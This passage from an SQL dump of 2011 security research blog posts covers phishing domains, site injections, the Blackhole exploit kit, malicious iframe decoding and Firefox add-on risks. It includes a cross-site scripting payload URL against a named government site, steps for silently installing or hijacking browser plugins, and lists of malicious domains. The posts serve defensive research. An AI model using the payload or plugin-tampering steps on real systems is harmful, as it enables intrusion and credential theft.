\r\n\r\nWe\'ll release updates to Zscaler Safe Shopping in the coming days and weeks as we get feedback from users. Don\'t hesitate to report any problems or submit question as a comment to this blog, or contact me directly at jsobrier@zscaler.com. This plugin is a nice addition to our Search Engine Security (SES) add-on to keep consumers safer online.\r\n\r\n \r\n\r\n\r\nShop Safely!\r\n\r\n-- Julien', 'Compromise;Data Breach', 'https://www.zscaler.com/blogs/research/zscaler-safe-shopping-stay-protected-against-compromised-or-fake-stores-online');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (424, 'Facebook Phishing Pages', 'Julien Sobrier', 'February 24, 2011', 'On 02/13/2011, I found several domains used for Facebook phishing, registered the same day:\r\n\r\n	securedirectsite.com\r\n	directsecuresite.com\r\n	securedsitedirect.com\r\n	highsecuritydirect.com\r\n	securedsitedirect.com\r\n	officialsecuredsite.com\r\n\r\nThese domains contain the same page: a simple form to enter a Facebook login and password.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Facebook Phishing page\r\n		\r\n	\r\n\r\n\r\nAfter entering the credentials, users are redirected to http://www.facebook.com/pages/Image-hosting-service/106354426063487#!/album.php?profile=1&id=208421665712, which lands the user at their Profile Pictures page. If the user was not yet logged into Facebook, he must login \"again\". The phishing page does not post the credentials to Facebook on the user\'s behalf.\r\n\r\nFast-flux DNS\r\n\r\nAll of the domains were registered by the same individual in China.\r\n \r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			WHOIS information for highsecuritydirect.com\r\n			 \r\n		\r\n	\r\n\r\n\r\nThe domains are bound to multiple IP addresses that change rapidly (aka fast-flux DNS):\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			DNS information for highsecuritydirect.com\r\n		\r\n	\r\n\r\nThey all use the DNS server fbnameserver.com, which has been used for other Facebook phishing sites in the past.\r\n\r\nRandom redirections\r\n\r\nOn 02/14/2011, these 6 domains where redirecting users to http://www.google.com/ in the morning. In the afternoon, they redirected users to http://www.facebook.com/. On 02/16/2011, they seem to display the phishing pages all the time. I\'m not sure why these redirections were set up earlier.\r\n\r\nThese domains are not yet blocked by Google Safe Browsing.\r\n\r\n-- Julien', 'Uncategorised', 'https://www.zscaler.com/blogs/research/facebook-phishing-pages');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (425, 'ICWAI Site Infected', 'ThreatLabz', 'February 24, 2011', 'After KVGBANK, now ICWAI has also been found to be the victim of an iFrame injection attack. My previous blog post reveals how famous sites from India like UPSC and KVGBANK have been compromised. These are reputable sites , which receive a high volume of traffic. This makes them an attractive target for attackers. The ultimate motivation of the attackers is to leverage the sites as a catalyst for spreading malware.    The ICWAI webpage http://www.icwai.org/icwai/docs/syllabus/cmainter.htm was found to be infected with a malicious 0 pixel iFrame. Injecting iFrames into legitimate websites has become an extremely common attack vector.    Screen-shot of the affected page:        Screen-shot of the source code :        The injected link no longer serves malware as the domain has been taken offline. The fact that the ICWAI page still contains the injected iFrame suggests that the injection vulnerability that led to the attack, may still be exposed and could lead to additional infections. Zscaler has informed ICWAI of this infection.    Screen-shot of hxxp://toneandpulse.com/check/versionl.php?t=676, the injected URL:        Fortunately, this domain has been added to the Google Safe Browsing block list. Online searches reveal information providing a clear indication that the “toneandpulse.com” domain has been used in various malware campaigns. A report from ThreatExpert shows that some of the links on this domain have been used to serve a known Trojan.    This is yet another example of the poor level of web application security, which is allowing attackers to infect legitimate, web sites with minimal effort.    Pradeep', 'Compromise', 'https://www.zscaler.com/blogs/research/icwai-site-infected');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (426, 'KVGBANK Affected With Malicious JavaScript', 'ThreatLabz', 'February 13, 2011', 'Karanataka Vikas Grameena Bank is victim of an attack. The site is comprised by the injection of malicious obfuscated JavaScript.    Home page of kvgbank.com :        Obfuscated JavaScript :        Multilevel obfuscated JavaScript was used to infect the site. Ultimately, it required two levels of De-obfuscation to fully decode it.    Part of De-obfuscated JavaScript:        The purpose of such attacks is to redirect the victims browser to pull content from a malicious site. Attackers have learned that it is far more effective to simply infect already popular websites, rather than set up a separate malicious site and social engineer victims into visiting it. In this particular instance, the De-obfuscated code opens a pop-up box depending on user\'s browser version. The link used now points to a parked domain but likely previously hosted malicious code.    Home Page of http://dldslauno.com/ld/ment/ :             Even though the malicious code is not delivered by above site, it is possible that the vulnerability that led to the attack has not yet been patched and further infection could occur, or in future the linked site may host malicious content. We have informed the bank about the infection.    Virustotal results shows 23 out of 43 AV\'s vendors trigger on the kvg bank site.    Pradeep.', 'Analysis', 'https://www.zscaler.com/blogs/research/kvgbank-affected-malicious-javascript');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (427, 'Blackhole Exploits Kit Attack Growing', 'ThreatLabz', 'February 11, 2011', 'Recently, we have seen an increase in Blackhole exploit kit attacks. Blackhole is yet another web exploit kit developed by Russian hackers. According to one forum, the author indicates that the kit will cost $1,500 annually, $1,000 for a half-year and $700 for 3 months. It is a very powerful kit with a number of recent exploits including Java and Adobe PDF exploits. The attacker has continually improved the kit with more obfuscation and crypto algorithms to avoid the detection by AV vendors. One of the lines from description of the kit says it all - “Exploits crypt on special algorithms that make it impossible to code analysis and detection of anti-virus as well as services,Tipo wepawet and other counterparts ...”. Analysis of this malicious toolkit showed that URL patterns remain the same for most of the malicious domains hosting the Blackhole exploit kit. A Google search for the URL patterns returns thousands of results for such domains and Google does generally flag them as malicious domains. Here is the screenshot of Google search:             The exploit kit sends heavily obfuscated JavaScript code with Java applet code, which will download a malicious JAR file to the system. Here is what the code looks like:             The above JavaScript code is formatted for better viewing. It is heavily obfuscated to avoid antivirus detection. If we decode the content, we see that the kit is targeting a recent vulnerability in Java. The VirusTotal result for above “.jar” file is very poor with only 2 antivirus engines triggering on it. Here is the decoded part of the script,             The above decoded JavaScript targets CVE-2009-1671. It will download a malicious binary called “info.exe” from the server and execute it on the system. The VirusTotal result for this file remains poor at only 47%. There is also another Iframe attack in the decoded JavaScript code.             The above code will append the malicious Iframe to the body of the webpage, which points to another malicious URL. The above malicious URL contains yet another malicious URL in an ASX file format. This is intentionally done to avoid a user prompt. Here is the source,             This URL then sends more obfuscated JavaScript code exactly like the second image of the blog. Once decoded it shows JavaScript code which targets CVE-2010-1885. Here is the decoded script,             We have seen many similar web exploits kits in the past and attackers are coming up with new ones like Blackhole with more features and reliable and undetectable exploits all the time. We are also seeing large number of malicious domains hosting Blackhole exploits kit. The detection ratio is generally very poor for malicious binaries contained in the kits. Even though the price of this exploit kit is high, it remains a sought after commodity.     Umesh', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/blackhole-exploits-kit-attack-growing');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (428, 'In Depth Analysis - Decoding HTML Style Tag Based Malicious Iframes', 'ThreatLabz', 'February 11, 2011', 'Injecting clear text or obfuscated malicious Iframes has become a common attack vector. By taking advantage of known/unknown vulnerabilities in web servers or applications, an attacker can inject a malicious Iframe which will point to a malicious domain hosting malware. Attackers continually modify the way they inject malicious Iframes, leveraging various encoding techniques, to hide their malicious code from security products. They also do this to add complexity for security researchers trying to decode the attacks in the first place. Recently, we came across another malicious Iframe attack which was carried out with the help of HTML style tags. Here is the screenshot of an attack found on an infected website:\r\n\r\n \r\n\r\nAttackers have been able to insert a malicious style tag and malicious JavaScript code at the bottom of the page in two separate locations. With the help of some JavaScript code and JavaScript DOM objects and properties, the attacker has injected his obfuscated malicious code. This code is difficult to decode with the help of tools like Malzilla or online services like jsunpack.org. This blog will explain how to decode such malicious hidden Iframes by properly reading the code step by step. Let’s start by formatting the code.\r\n\r\n\r\n\r\n \r\n\r\nThe above code contains one style sheet defined by “#c19”. After further inspection of the code, we determine that variable “WnmaQ” is defined with function “YYSXc()”. After that, there are 3 other variables defined, with 2 of them containing garbage or useless functions and then there is a call to the original function by accessing “Wnmaq.YYSXc()”. This means this code will call the function inside the first defined variable which is “Wnmaq”. Now let’s format that function and break the code into parts so that we can decode it step by step. Here is first part of the script,\r\n\r\n \r\n\r\n\r\n\r\nLooking at the code above, we can see there are some garbage or useless variables and functions are declared for no purpose, such as variable “l”, “v” and function “nB()”. There are many such garbage variables and functions declared throughout the script. They are never used for any significant purpose. So we will skip those dirty useless variables, functions. We will only concentrate on useful variables, code and functions used for decoding this malicious JavaScript. There is variable “g” declared with a “new Date()” function, which is in the form of an array. The first array element is a year and second is a month and so on. Then variable “o” is defined with a “g.getMonth()” function which means variable “o” will contain value “10” which is the second array element and called as month. Then variable “r” will contain the string “from10e”. The value 10 in this variable and is replaced by the “CharCod” string, so finally we have an interesting string in variable “r”, which is nothing but “fromCharCode”. Variable “i” is defined with object “document.styleSheets”, which will return list of style sheets. Let’s decode the second part of the main script,\r\n\r\n\r\n\r\n \r\n\r\nThe above “for()” loop will actually extract the array data from the style tag defined earlier. I have put some comments inside the image to better explain the components of the code. Initially, variable “q” is matched with elements corresponding to the style sheet rule with the help of the “.selectorText” property. If the loop matches the string”#c19” of the style sheet, the code will continue. The next variable “w”, actually retrieves the array from the style sheet rule with the help of the property “.style.backgroundImage”. Now, we finally have useful variables. At this point, we should test to ensure everything seems reasonable. Let’s create a simple “test.html” file and add only important variables, style sheet tags and code inside the HTML file. We will test what the variable “w” will contain after above code with the help of “alert()” function. The sample HTML file is shown below:\r\n\r\n\r\n\r\n \r\n\r\nWe have removed everything and added only those variables which we decoded earlier. We should get array values from style tag. Here is what the variable “w” will contain after running above file.\r\n\r\n\r\n\r\n \r\n\r\nSo, the second part of the script just retrieved values from style tag. This shows our analysis is on the right track. We will keep this “test.html” file as it is and will add more interesting code after additional analysis. Let’s look into next part of the main script:\r\n\r\n\r\n\r\n \r\n\r\nThe above code explains that variable “c” will contain string called “split” and variable “m” will contain array values separated by commas. The variable “k” will contain a value which will be the array length divided by 2. We will add all above 3 lines of code into our “test.html” file and will then alert the value of “k” for our purposes. The variable “k” will contain the value 90 if you run the modified “test.html” file. The above code also contains garbage code as mentioned earlier. Let’s decode the last part of the main script,\r\n\r\n\r\n\r\n \r\n\r\nThe above code is the last part of the main malicious script. Here we will finish the decoding of the code and will come to determine the main malicious code behind this. As analyzed earlier, variable “k” will contain value 90 and this “for()” loop will run 90 times. The function “parseInt()” is used to obtain the exact integer. The variable “o” will contain the month of the date object, which is 10. The variable “r” contains the string “fromCharCode”, which we found earlier. So finally variable “j” will look like,\r\n\r\nj += String[“fromCharCode”][rZ];\r\n\r\nThe loop will continue and variable “j” will be appended with characters retrieved from above expression. This is the main code behind the entire script. The last variable “kW” contains the JavaScript function “eval()” and then there is call to this function with parameter “j”. This tells us that the malicious content will evaluate the code inside the variable “j”. Let’s add this “for()” loop inside our earlier “test.html” file and we will alert the value of “j” to find out the hidden code. This is what our final “test.html code will look like:\r\n\r\n\r\n\r\n \r\n\r\nWe have only added useful variables, loops and JavaScript code in the above file. We have removed useless variables and functions from the main script. Now here is what you see when you run the above file:\r\n\r\n\r\n\r\n \r\n\r\nThe malicious Iframe pointing to malicious domain is finally revealed. The attacker has created the malicious JavaScript code with the help of a style tag to generate a malicious Iframe. This process can be difficult to analyze and tools or services may fail due to the complex nature of the code and various tricks used by attacker. However, if you have a little patience and good eyes, it is very easy to decode such malicious JavaScript code by understanding the flow of the code. That’s it for now.\r\n\r\nHappy Decoding\r\n\r\nUmesh', 'Analysis;Malware', 'https://www.zscaler.com/blogs/research/depth-analysis-decoding-html-style-tag-based-malicious-iframes');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (429, 'Browser Plugins And Security Considerations', 'Julien Sobrier', 'February 10, 2011', 'Firefox is an ideal browser platform for creating add-ons. Firefox plugins have access to the entire browser, without any restriction. This allowed me to release two plugins to improve the security of Firefox users (Search Engine Security, and BlackSheep), and a third one is in the works, but the power of Firefox plugins can also be used with malicious intent.\r\n\r\nFull access to the browser and the computer\r\n\r\nFirefox plugins have access to the entire browser, including HTTPS content and also to the operating system. This means that any add-on can:\r\n\r\n	see login/password credentials in clear text, even over HTTPS connections\r\n	send back the credentials to any website\r\n	modify the web pages seen by the user (often done by Adware)\r\n	add/delete/modify files on the computer (even outside of the Firefox directory)\r\n	run executables, either embedded in the plugin or downloaded at any point\r\n\r\nThe ability to see content in clear that is sent over HTTPS is unique to browser plugins.\r\n\r\nThere is no concept of permissions or sandboxing for Firefox plugins. Once a user installs a plugin, it has full access to the computer. This is why Firefox imposes a 3-second warning message before you install a plugin. You\'d better be sure you trust it fully!\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Are you really sure you want to install this add-on?\r\n		\r\n	\r\n\r\n\r\nFirefox plugins have been created to steal credentials or insert advertising in web pages.\r\n\r\nNo permissions checks or sandboxing\r\n\r\nGoogle Chrome, on the other hand, requires every plugin to stipulate which domain can be accessed. They are shown to the users before the plugin is installed. It also has more limited capacities, like the inability to listen to all HTTP connections, which ultimately makes Chrome plugins safer, but less versatile.\r\n\r\nFirefox has no restrictions at all on what the a plugin can do, or access. Some versions of Windows or various security tools will ask permission from the user if a plugin access files outside of the Firefox folder, or tries to run an executables. However, this was not the case on my Windows 7 Home version.\r\n\r\nThe only security measure implemented in Firefox is to forbid the installation of plugins from websites other than the official Mozilla site, by default. Users must first allow a domain to install plugins from, then click on \"Install\" after a 3-second wait period.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Plugin installation is blocked by default\r\n		\r\n	\r\n\r\n\r\nOfficial Mozilla add-ons review cycle\r\n\r\nAll add-ons submitted to the official Mozilla Add-Ons site go through a manual source code review. This process attempts to ensure that the plugins are not malicious. Each update of the plugin also goes through a manual review. The down side is that it takes days, or weeks, for every little change to be approved.This is why I prefer to release plugins on our website first and wait until the add-on is stable to submit it to the Mozilla site.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Manual code reviews of Search Engine Security\r\n		\r\n	\r\n\r\nThe only way to be reasonably sure that a plugin is safe is to download it through the official website. There used to be a loop hole, though - add-ons used to be allowed to be listed on the site, but hosted somewhere else. In that case, the official reviewers could not guarantee that code downloaded by the users was the same as what they approved. This option is not available anymore. All add-ons and updates have to be hosted by Mozilla and be listed on their site - that is why BlackSheep is lot listed anymore.\r\n\r\nSilent plugin installation\r\n\r\nWhenever you install a new plugin, it takes effect only after you restart Firefox. Firefox also display a box showing which plugins were newly installed.  However, there are ways to install a plugin silently.\r\n\r\nAn attacker could trick users into downloading a program that would do a silent installation of a malicious plugin in order to get full access to the user surfing data, including login and password information sent over encrypted channels.\r\n\r\nNew add-on\r\n\r\nAll the add-ons are stored under the Firefox profile, a known location, within their own sub-folder. A new folder can be created and filled with a malicious plugin. Firefox keeps information about the existing add-ons in three files: extensions.rdf, extensions.ini and extensions.cache. If any of these file are deleted, Firefox re-builds them automatically at the next start up, without informing the users.\r\n\r\nAfter adding the malicious plugin to the Firefox profile, the three files should deleted. This will not prevent the current Firefox session from running or impact existing plugins. When Firefox is restarted, these files are re-generated, and the new plugin is added to the list without any notification to the user.\r\n\r\nAdd-on overwrite\r\n\r\nEach plugin includes the file install.rdf, which contains metada data about the plugin: name, version, home page URL, etc. The parameter updateURL tells Firefox which URL to use to check for new updates. Malware can simply add or modify the updateURL value for existing add-ons, then remove extensions.rdf. The new updateURL can be used to force the update of a plugin with a version that contains the old add-on plus malicious code.\r\n\r\nWith this technique, the malicious installation is completely invisible.\r\n\r\nThe Firefox plugin framework is very powerful. There are not adequate protections put in place to ensure the integrity of plugins after they are installed. I hope some future version of Firefox will put additional protections in place to avoid tampering of installed plugins.\r\n\r\n-- Julien', 'Analysis', 'https://www.zscaler.com/blogs/research/browser-plugins-and-security-considerations');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (430, 'Facebook And The HTTPS/Security Paradox', 'ThreatLabz', 'February 07, 2011', 'Last month, Michael published his 2011 security predictions. His second prediction in his list of 10 discussed SSL Only Sites:  In 2011, expect a handful of major vendors to finally tackle this challenge head on and deploy SSL only websites.  Facebook recently announced on their blog that users will have the ability to have all of their transactions encrypted via HTTPS. This is a step in the right direction for protecting your account and your privacy - particularly when using public wifi. I have already blogged about session-id stealing from HTTP transactions (sidejacking), which was further publicized with the release of FireSheep and BlackSheep. Unfortunately, on Facebook, usage of HTTPS is not enabled by default - users still have to enable this setting within their Account Settings page.      There have been a number of security concerns and issues with Facebook- for example,    	Koobface / malicious \"videos\" advertised and spread          	Rogue Facebook Applications - here is a recent rogue \"photo\" app that I saw with relatively poor A/V detection (11/43):        	  		  			  			  		  	      The bad guys are abusing popular web sites/services that users trust. As these sites move to SSL-only versions, while private information may be better protected, any embedded malicious content will be encrypted and potentially invisible from your enterprise\'s IDS/IPS. This is the security paradox that I speak of: moving to HTTPS for all transactions protects against sidejacking and protects user\'s privacy, but this also prevents inspection of network transactions for malicious content ... this is potentially a very scary \"blindspot\" within enterprise environments. This type of \"blindspot\" exists in other services as well, e.g., Gmail.    However, all is not lost- there are several available security avenues for security-conscience organizations that allow Facebook within their environment:    	Host-based protections:  	  		Facebook security apps  		Client anti-virus  		Browser plug-ins  	  	  	SSL-inspection engines:  	  		SSL-proxy with content inspection (appliance or SaaS-based)  	  	    The difficulties with host-based protections include manageability and information feedback (logs). SSL-inspection engines on the other hand, can be easier to manage and provide centralized, aggregated logs (this is particularly true of the SaaS-based models). SSL-inspection does however require the ability to temporarily break \"end-to-end\" encryption which necessitates trusting the proxy and web server certificate validation process. This often causes confusion for management when making the decision on whether to inspect SSL transactions on the network or not.    SSL-inspection engines work by establishing an SSL encrypted session between the web client and proxy, which separately creates a second SSL session between the proxy and the web server. The proxy makes the actual requests to the web server, handles/inspects the received content, and forwards it to the client. In this model the client must trust the certificates from the proxy, and it is important for the proxy to handle certificate verification of the web server.    Zscaler provides SSL-inspection as part of its solution.    Our customers also have the ability to set policy to block transactions to all/or certain social networking sites. Currently, about 16.26% of our customers had transactions that were blocked due to a social networking policy rule.    As Facebook and other popular web services move to SSL-only, enterprises will have a dilemma: (1) accept the risks and rely on host-based protections alone for this content, (2) incorporate SSL-inspection technologies, or (3) incorporate policy enforcement for the sites in question.', 'Analysis', 'https://www.zscaler.com/blogs/research/facebook-and-httpssecurity-paradox');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (431, 'Unchecked Redirection + URL Shortener = Spam', 'Julien Sobrier', 'February 03, 2011', 'Recently, I found several legitimate sites, with bad coding practices,  used to redirect users to spam sites with the help of URL shorteners. Here is how the scam works:The legitimate sites have a warning page for all links to external sites (i.e. http://good.com/redirect?url=http://example.com/) The warning page can be used to redirect users to any domain, including spam sites and malicious pages (i.e. http://good.com/redirect?url=http://spam.com/)  Spammers use a URL shortener like bit.ly to hide the long URL (i.e. http://bit.ly/aaaa redirects to http://good.com/redirect?url=http://spam.com/ which redirects users to http://spam.com/)Most URL shorteners do some checks on the final URLs to prevent spammers from using their service. By using a legitimate intermediate site, the attackers prevent URL shortening services from checking the true final destination and therefore prevent blacklisting or blocking of the shortened link.fmcsa.dot.govOne example of such redirection pages is http://www.fmcsa.dot.gov/redirect.asp?page=http://www.zscaler.com/. Change http://www.zscaler.com/ to any URL. I\'ve seen this page used to redirect to the rogue pharmacy canadapharm.org.The redirection is not done by the standard Meta refresh tag (meta http-equiv=\"refresh\" content=\"6;url=http://www.zscaler.com/\"), but by custom JavaScript. Even if the URL shortener was looking at the HTML content to figure out the final destination, it would very likely not haven seen the redirection to an external domain.XSSIn addition to being used by spammers, fmcsa.dot.gov includes a crosss-site scripting vulnerability: the link can be used to execute any JavaScript. The screen shot below was taken for the URL http://www.fmcsa.dot.gov/redirect.asp?page=javascript:alert%28document.cookie%29;Cross-Site scripting on fmcsa.dot.govUnchecked redirections is yet another security flaw that developers need to keep in mind when developing a website. Having a website widely used for spam will likely get it blacklisted by Google Browsing and other security and spam blacklists, preventing users to access any page on the website unless they dare ignore the scary warning message from their browser.-- Julien', 'Abuse;Phishing', 'https://www.zscaler.com/blogs/research/unchecked-redirection-url-shortener-spam');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (432, 'Egyptian Revolution ... Back Online', 'ThreatLabz', 'February 02, 2011', 'In the days during the Egyptian Internet outage, a number of Egyptian\'s circumvented the outage through a variety of methods. Speak2tweet is one example of a work-around in which Egyptians could phone in their tweets using the SayNow service. This service grew enormously in popularity in both posters and readers/listeners- we saw roughly a 362% increase in traffic to SayNow yesterday.\r\n\r\nEarlier this morning, Egyptian ISPs restored their Internet routes (reference). I wanted to publish a short post verifying that we are seeing a return of Egyptian client and server web transactions. Currently, we\'re seeing about 80% of the Egyptian client transactions to Aljazeera and much of the remaining transactions are to Facebook, Google, and MSN. The Egyptian web server activity has returned to what we had seen prior to the outage. We will continue to monitor and report anything that is interesting or unusual within Egyptian client or server web transactions.', 'Analysis', 'https://www.zscaler.com/blogs/research/egyptian-revolution-back-online');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (433, 'Egypt ... Now Just Gyped', 'ThreatLabz', 'January 30, 2011', 'There are a number of good references discussing the recent events in Egypt and the subsequent Egyptian-government ordered Internet shutdown (ISPs in Egypt have withdrawn their routes via BGP- timeline). This shutdown includes cellphone SMS/MMS/data networks. The premise for the government-ordered shutdown was to avoid what recently happened in Tunisia where social networks (Facebook in particular) and blogs helped to strengthen and organize protests (reference). In Egypt, a video was recorded of a protester being shot in the head, point-blank by police - in an effort to prevent this and other information from going viral and escalating protests, the Egyptian government (allegedly) ordered this Internet-shutdown.    In a recent report, it was shown that over 50% of Egypt\'s Internet users are the youth of the nation (18-34 year old) and that the \"social media scene has quickly gained ground\" among its users. Zscaler was servicing a number of web transactions for customers from Egypt before the routes went dark. I wanted to share some stats on what we were seeing in terms of web usage up until the plug was pulled January 27 at 22:34 UTC.    The following chart shows the daily percentage of the week\'s web transactions from/to Egypt clients/servers that traversed our cloud from January 24th - 28th. The y-axis is the percentage of transactions from all Egypt transactions we observed from Jan. 24- 28.    Egypt\'s Web Transactions Preceding Shutdown     Our data showed a 68% percent increase in transactions to Egypt web servers on January 26th - the spike was most noticeable in the News/Media category of web servers for people using Egyptian news sources to obtain information on the protests. Then we see the decline and eventual drop to (near) zero on January 28th for Egyptian web transactions (client and server). Taking a look at the web server transactions for the 28th showed www.egyptse.com, the Egyptian Stock Exchange, (217.139.183.2 - NOOR network) remaining live and visited by customers - as others have noted, this remains the only live Egypt network.    Among the Egyptian websites that were visited on the 27th, that are no longer accessible include:      	*.masrawy.com (41.178.51.93)  	*.ahram.org.eg  	*.arabia.msn.com (41.178.51.12)  	www.egynews.net -> productnews.link.net (41.178.51.29)  	egypt.usaid.gov (196.219.223.215)  	algomhuria.net.eg  	ahram.org.eg  	*.gov.eg sites    The .eg domains no longer resolve due to the Egyptian nameservers being inaccessible from the Internet outage. There are stories that discuss this DNS outage (here).    On January 27th, prior to the shutdown, this is the breakdown in web surfing activity that was being seen from client traffic originating in Egypt.  The above chart illustrates the Egyptian Internet usage during the protests and leading up to their Internet shutdown. Social media and news related web pages accounted for roughly 65% of the web browsing that was done from Egyptian client IPs through our cloud.    The top sites visited by Egypt web clients on the 27th include:    	Facebook related (42.02% total)  	  		*.facebook.com (25.36%)  		*.fbcdn.net (16.66%)  	  	  	*.aljazeera.net (6.63%)  	Google (6.96%)    The Internet remains dark for nearly all of Egypt to (allegedly) stop what these stats show - the ability to stay up to date with news/events and communicate and share ideas with friends ... after all, information is power. I leave it to the reader to decide whether the end justifies the means, whether this is an acceptable form of \"censorship\" and whether these measures should ever be permissible. In any case, the world is watching and learning from these historical events.', 'Analysis', 'https://www.zscaler.com/blogs/research/egypt-now-just-gyped');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (434, 'Web Transactions Per User Per Day', 'ThreatLabz', 'January 25, 2011', 'I searched the web recently looking for statistics on the average number of web transactions that end-users make per day, and equations for estimating end-user web transactions. I couldn\'t find anything that was worth repeating, so I ran my own numbers from Zscaler data.      First, a quick note on what I\'m defining as a web transaction- all HTTP(S) client requests / server responses. Some web pages have a large number of web transactions associated with a single web page, for example, the cnn.com homepage has 127 transactions:  Other\'s like Google\'s search results pages contain only a few transactions:  I took a random sampling of 100,000 users (excluding group accounts and inactive users) for a 24-hour period on a non-holiday mid-week day. These users are from a global population of enterprise users that typically work an 8-10 hour day. I set a minimum threshold of 500 transactions for an account to be considered an active user - those with less than 500 transactions could be system-driven versus user-driven transactions (e.g., Windows Update), part-time workers, or temporary/test accounts.    The average for this data sample was:  3343.80227 web transactions per user per day     So, within a small organization with 1,000 active users - there are roughly 3.34 million web transactions from the organization\'s user population during a workday. Note: when I originally ran the numbers I included accounts with <500 transactions within the randomly selected user population- these accounted for roughly 14% of the randomly selected user population and brought the average down to 2251 web transactions per user per day. Because it is unlikely that an organization\'s entire user-population will be active at once, it may be important to consider approximately 10% of your organization\'s user-population as inactive.    The maximum number of web transactions from a single user account was 597,064 (this was an outlier). The median (50th percentile) was 1912 web transactions per user per day.      The above plot is the number of users (Y-axis) with a web transaction count between 500 and 4,000 (X-axis) for a 24-hour period. There are a number of users with <1000 transactions in a day, but there is a long \"tail\" to the right of highly active users. Plotting the aggregated user count for web transaction ranges in the thousands (e.g., data point 2 contains the transaction range 2000-2999) with the transaction range in reverse order shows that the curve is roughly exponential (inverse natural log function).    The black trendline that was generated in Excel from our data was:     y = 18293e ^ (-0.267x)  Where,  e is the mathematical constant, 2.71828  x is the transaction range in thousands (e.g., 2 = 2000-2999 transactions)  y is the user population (based on a 100,000 user population) that fall into the \"x\" transaction range    To estimate your user population for a specific transaction range, modify the equation to be:     y = (total_user_population * 0.18293e) ^ (-0.267x)     Using this function it is possible to roughly estimate the number of users that have a specific range of transactions (e.g., power web users) within an organization within a 24-hour period.          A relatively small organization of 300 users must deal with an estimated 1 million web transactions in a 24-hour period for their user population. Some estimates of the 2011 Federal Government payroll state a work-force of 1.35 million Federal civilian employees -- this is an estimated 4.5 billion web transactions a day (this does not include Federal civilian contractors).    These types of numbers are good for an organization to be aware of when considering scaling solutions for enforcing web security / policy and for storing and analyzing transactions.', 'Analysis', 'https://www.zscaler.com/blogs/research/web-transactions-user-day');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (435, 'Alexa Illustrates Web Security Risks (part 2)', 'ThreatLabz', 'January 24, 2011', 'I wanted to circle back and close the loop from my original post on this. First- not surprisingly I’m not the only one to have taken note at malicious sites landing in Alexa (reference sucuri.net blog).    I wrote some scripts to check a number of the domains listed in the Alexa top 1 million against Google SafeBrowsing (GSB), SURBL, and to cross-reference with MalwareDomainsList (MDL). In the previous post, I mentioned a few of my findings related to GSB and SURBL lookups - particularly FakeAV. Additionally, a number of the sites listed included porn sites that were listed in SURBL due to their advertisements within spam links. Snippet of some of the results.  While the GSB and SURBL lookups for 1 million sites aren\'t very quick repeatable processes, it is a fairly quick process to do the cross-reference with the MDL (MDL list here). The results from today\'s Alexa and MDL intersection include 87 sites. However, several of the listed sites are overly aggressive listings on MDL\'s part- for example: hotfile.com, rapidshare.com, and stashbox.org are free file hosting services that are listed. Free file hosting services are frequently abused to store malware- however, the sites themselves are legitimate and should not be blocked at the domain level.    Some of the more interesting sites listed, include:      	bulletproof-web.com - as the name suggests, it\'s a bullet-proof hosting provider            	bloggoogle.info, domaingoogle.info, hostinggoogle.info, datagoogle.info, businessgoogle.info - NeoSploit exploit kit (reference example)  	gdfgdfgdgdfgdfg.in.ua - FakeAV drive-by redirect related to Twitter spam campaign (reference example)  	protect-pc-2011.co.cc, multy-protect.co.cc, fastperot.co.cc - TDSS rootkit / FakeAV      Seeing these Alexa results further illustrates the threat of FakeAV and the recent come-back of NeoSploit in 2011 that others have highlighted with the release of its version 4 (reference example).', 'Malware', 'https://www.zscaler.com/blogs/research/alexa-illustrates-web-security-risks-part-2');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (436, 'Using TheBrain To Visualize Web Transaction Logs', 'ThreatLabz', 'January 24, 2011', 'For those unfamiliar with TheBrain - it is a highly interactive mind-mapping software, which includes a free edition called the PersonalBrain. I have used this software on-and-off for a few years, and really like it for organizing and interacting with my thoughts when I start a new project. I recently took a look at using the software to organize and visualize web transaction logs for analysis (specifically to extract suspicious / malicious transactions). Below details my experiences - I\'m curious to know what others have found to work.    After exchanging a few emails with TheBrain support (they are very responsive) - they shared a 5-page document on their supported XML formats. A DTD file is available, and is extremely easy to convert your data into \"Thoughts\" and \"Links\" (just make sure to properly handle any XML entities within your data). Thoughts are basically nodes within your mind-map and links can be parent/child or \"jump\" relationships (I think of these as bi-directional \"lookup\" relationships or cross-references). In my case I wrote a Perl script to extract and convert portions of my data into the supported XML format and then imported it into PersonalBrain.  The above is data from 5 transactions imported into the PersonalBrain with these relationships:    	ServerIP, Domain, URLPath, RequestType, Country, ASN, Score, AnalyticCheck, and Transactions are all children of Data, and each has related data under each Thought. For example, 1.2.3.4 falls under ServerIP and China falls under Country.  	ServerIP data has jump links to related ASN, Country, and Domain data and vice versa (the links are bi-directional)  	Domain data has jump links to related URLPaths and vice versa  	Transaction data has related jump links to ServerIP, Domain, URLPath, RequestType, Country, ASN, Score, and AnalyticCheck and vice versa      By having the data in this visual format, it is easy to quickly drill-down and view transactions with higher \"suspicious\" scores and then cross-reference their transaction information with other transactions. You have the ability to 